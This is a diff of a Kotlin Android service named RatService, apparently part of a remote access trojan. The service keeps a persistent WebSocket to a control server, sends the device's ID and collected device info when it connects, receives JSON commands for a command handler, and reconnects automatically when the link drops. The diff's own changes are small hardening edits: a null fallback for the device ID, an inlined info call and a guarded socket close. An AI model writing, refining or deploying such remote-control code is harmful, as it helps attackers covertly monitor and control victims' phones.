@@ -11,12 +11,10 @@ import okhttp3.*
 import java.util.concurrent.TimeUnit
 
 class RatService : Service() {
-
     private val client = OkHttpClient.Builder()
         .readTimeout(0, TimeUnit.MILLISECONDS)
         .pingInterval(20, TimeUnit.SECONDS)
         .build()
-
     private var ws: WebSocket? = null
     private val gson = Gson()
     private var deviceId: String = ""
@@ -27,7 +25,7 @@ class RatService : Service() {
         super.onCreate()
         deviceId = android.provider.Settings.Secure.getString(
             contentResolver, android.provider.Settings.Secure.ANDROID_ID
-        )
+        ) ?: "unknown"
         handler = CommandHandler(this, deviceId)
     }
 
@@ -61,7 +59,6 @@ class RatService : Service() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
                 sendInfo(webSocket)
             }
-
             override fun onMessage(webSocket: WebSocket, text: String) {
                 try {
                     val obj = gson.fromJson(text, JsonObject::class.java)
@@ -80,14 +77,12 @@ class RatService : Service() {
                     }
                 } catch (_: Exception) {}
             }
-
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                 if (running) {
                     Thread.sleep(App.config.reconnectDelayMs)
                     connect()
                 }
             }
-
             override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                 if (running) {
                     Thread.sleep(App.config.reconnectDelayMs)
@@ -98,10 +93,9 @@ class RatService : Service() {
     }
 
     private fun sendInfo(socket: WebSocket) {
-        val info = handler.collectInfo()
         val payload = JsonObject().apply {
             addProperty("type", "info")
-            add("info", gson.toJsonTree(info))
+            add("info", gson.toJsonTree(handler.collectInfo()))
         }
         socket.send(gson.toJson(payload))
     }
@@ -119,7 +113,7 @@ class RatService : Service() {
 
     override fun onDestroy() {
         running = false
-        ws?.close(1000, "stop")
+        try { ws?.close(1000, "stop") } catch (_: Exception) {}
         super.onDestroy()
     }
 
